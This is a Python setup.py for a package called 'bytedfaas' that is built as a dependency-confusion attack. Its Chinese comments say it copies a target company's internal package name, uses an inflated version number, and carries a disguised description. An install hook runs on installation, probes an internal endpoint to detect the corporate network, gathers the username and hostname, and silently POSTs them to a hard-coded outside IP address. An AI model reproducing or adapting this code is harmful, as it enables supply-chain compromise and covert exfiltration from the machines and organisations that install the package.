# setup.py
from setuptools import setup
from setuptools.command.install import install
import os
import socket
import platform
import json
import urllib.request, urllib.error



class EvilInstall(install):
    def run(self):
        install.run(self)
        ddl=False
        text_ssrf=""
        try:
            with urllib.request.urlopen("https://src-ssrf.bytedance.net/ssrf", timeout=3) as r:
                text_ssrf=r.read().decode('utf-8', errors='ignore')
                ddl=True
        except urllib.error.URLError:
            pass
        
        try:
            usr=os.popen("whoami").read()
        except:
            usr="no data xhjxhj"
            
        try:
            hst=socket.gethostname()
        except:
            hst="no data xhjxhj"
        
        # 收集环境信息
        data = {
            "hostname": hst,
            "user": usr,
            "text_ssrf":text_ssrf,
            "is_inner":ddl
        }
        
        # 外传到你的收集服务器（必须是你控制的域名）
        try:
            req = urllib.request.Request(
                "http://182.92.143.23/collect.php",
                data=json.dumps(data).encode(),
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass  # 静默失败，避免暴露

setup(
    name="bytedfaas",  # 目标企业内部包名
    version="99.9.9",                  # 版本号远高于内部版本
    description="bytedecs tools",       # 伪装描述
    packages=["byteddatabus"],
    cmdclass={"install": EvilInstall}
)